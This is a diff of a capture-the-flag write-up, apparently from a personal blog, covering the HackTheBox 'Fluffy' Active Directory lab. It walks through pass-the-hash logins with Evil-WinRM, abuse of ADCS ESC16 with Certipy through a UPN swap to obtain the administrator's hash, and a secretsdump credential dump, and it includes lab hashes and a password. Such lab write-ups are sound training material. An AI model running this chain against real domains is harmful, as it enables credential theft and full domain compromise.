@@ -7,12 +7,6 @@ tags = ["hugo", "cloudflare", "github", "blowfish", "static-site"]
 +++
 # Phase 1: External Reconnaissance and Initial Access
 
-**Duration**: [Start Time] → [End Time] ([X] hours)  
-**Key Finding IDs**: FIN-001, FIN-002, FIN-003  
-**Result**: Initial shell access as [User] on [Host]
-
----
-
 ## Objective
 
 Identify and exploit externally accessible vulnerabilities to gain initial foothold into the target network.
@@ -23,21 +17,9 @@ As is common in real life Windows pentests, you will start the Fluffy box with c
 
 ---
 
-## High-Level Steps
-
-1. Reconnaissance and OSINT
-2. Service enumeration and fingerprinting
-3. Vulnerability identification
-4. Exploitation
-5. Initial access confirmation
-
----
-
 ## Detailed Walkthrough
 
 ### Step 1: Reconnaissance
-
-**Tools Used**: nmap, netexec, smbclient,Responder, hashcat 
 
 ```bash
 # Port scanning
@@ -133,8 +115,6 @@ smb: \> ls
 smb: \> get Upgrade_Notice.pdf
 getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (23.5 KiloBytes/sec) (average 23.5 KiloBytes/sec)
 ```
-
-![[Upgrade-Notice-PDF.png]]
 
 ``Found information about CVE-2025-24071  -Windows File Explorer Spoofing``
 ```python
@@ -401,16 +381,6 @@ P.AGILA::FLUFFY:5fa13cf1232a1356:0923fb511fc78cd8cc088bff0ab720cc:01010000000000
 bloodhound-python -c All -u P.AGILA -p prometheusx-303 -d fluffy.htb -dc DC01.fluffy.htb -ns 10.129.232.88 --zip
 ```
 
-![[Pasted image 20251028151436.png]]
-
-
-![[Pasted image 20251028151614.png]]
-
-![[Pasted image 20251028151835.png]]
-
-
-![[Pasted image 20251028235308.png]]
-
 ``p.agila is member of Service Account Managers group and Service Account Managers group have GenericALl over Service Accounts --> winrm_svc , ca_svc, ldap_svc .
 ca_svc is most interesting part because it can escalate to administrators  from certificate misconfiguration``
 
@@ -561,68 +531,244 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
-dbd7a0a2fb1b09180baf50878c70781b
+dbd7a0a2f<REDACTED>
 *Evil-WinRM* PS C:\Users\winrm_svc\Desktop>
 
 ```
 
 
-
-
-
-**Findings**:
-- CVE-2025-24071 is mentioned in Upgrade_Notice.pdf 
-- [Finding 2]
-
----
-
-### Step 2: Service Enumeration
-
-**Services Identified**:
-- [Service 1] on [Port]
-- [Service 2] on [Port]
-
-**Versions Identified**:
-- [Software] v[Version] → Vulnerable to [CVE]
-
----
-
-### Step 3: Exploitation
-
-**Vulnerability Used**: FIN-001 - [Vulnerability Name]
-
 ```bash
-# Exploitation command
-[Command]
+# Deploy persistence
+❯ evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
 
-# Result
-[Output showing successful exploitation]
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../Desktop/
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---       10/28/2025   7:12 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
+dbd7a0a2fb1b09180baf50878c70781b
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop>
+
 ```
 
----
-
-### Step 4: Initial Access Verification
-
+``Let's find vulnerable templates``
 ```bash
-whoami
-id
-pwd
-hostname
+certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
 ```
 
-**Access Level Achieved**: [User/System/Admin] on [Host]
+``Vulnerabilities ESC16 : Security Extension is disabled.`` 
 
----
+``We can read about upn (userPrincipleName) ca_svc from winrm_svc ``
+```bash 
+❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-## Artifacts Created
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+❯
+```
 
-- Shell type: [bash/cmd/powershell]
-- Location: [Path/method]
-- Persistence: [Method used]
 
----
+``We can update userPrincipleName of ca_svc to administrator ``
+```
+❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
+/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-## Next Phase
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+❯
+```
+
+``Request certificate of administrator``
+```
+❯ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
+/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 17
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+``We change upn of ca_svc back to original ``
+```
+❯ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
+/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+```
+
+``Since we got certificate as administrator, let authenticate to the domain``
+```
+❯ certipy auth -dc-ip 10.129.232.88 -pfx administrator.pfx -u administrator -domain fluffy.htb
+/root/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+``We got hash of Administrator. ``
+
+
+```bash
+# Privilege escalation command
+
+
+❯ evil-winrm -i 10.129.232.88 -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---       10/28/2025   7:12 AM             34 root.txt
+
+
+cat *Evil-WinRM* PS C:\Users\Administrator\Desktop>  cat root.txt
+d3abf02327f<REDACTED> 
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+
+```
+
+```bash 
+❯ secretsdump.py -hashes :8da83a3fa618b6e3a00e93f676c92a6e FLUFFY/Administrator@10.129.232.88
+/root/.local/pipx/venvs/impacket/lib/python3.11/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xffa5608d6bd2811aaabfd47fbc3d1c37
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+FLUFFY\DC01$:aes256-cts-hmac-sha1-96:34b5e3f67441a6c19509cb966b9e5392e48257ff5058e7a22a4282fe822a5751
+FLUFFY\DC01$:aes128-cts-hmac-sha1-96:19a1dd430a92c3568f04814342d8e486
+FLUFFY\DC01$:des-cbc-md5:ec13a85edf688a85
+FLUFFY\DC01$:plain_password_hex:c051a2b56dd8422b09fcc441e1bfaf0a5f0fe659a1634184e7dd6849da03747cad2050bd71e55da3e979245cb872106b52367ac876380294db669d308655c9f8f72b71ea10b4cc90199e1a059645dad4e77b3b982de60b7a59af8d4261b0077be1890caf3aa7e6290dcbc0c443f81bc6124cdef4e26472b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb
+FLUFFY\DC01$:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::
+[*] DefaultPassword
+p.agila:prometheusx-303
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x50f64bc1be95364da6cc33deca194d9b827c4846
+dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5
+[*] NL$KM
+ 0000   0B 4A EC B4 04 86 59 99  A3 11 64 45 1D F8 EF E0   .J....Y...dE....
+ 0010   74 E0 BB 5A 07 EA AD B9  63 4D AB 03 B5 0F 69 3D   t..Z....cM....i=
+ 0020   C5 C2 F8 4E F0 EC EC B6  28 A2 59 AB BA 2B F0 A2   ...N....(.Y..+..
+ 0030   57 89 D1 62 FA 69 04 2A  31 57 54 5A FB B0 2A 18   W..b.i.*1WTZ..*.
+NL$KM:0b4aecb404865999a31164451df8efe074e0bb5a07eaadb9634dab03b50f693dc5c2f84ef0ececb628a259abba2bf0a25789d162fa69042a3157545afbb02a18
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+```
 
 [Link to Phase 2]
 
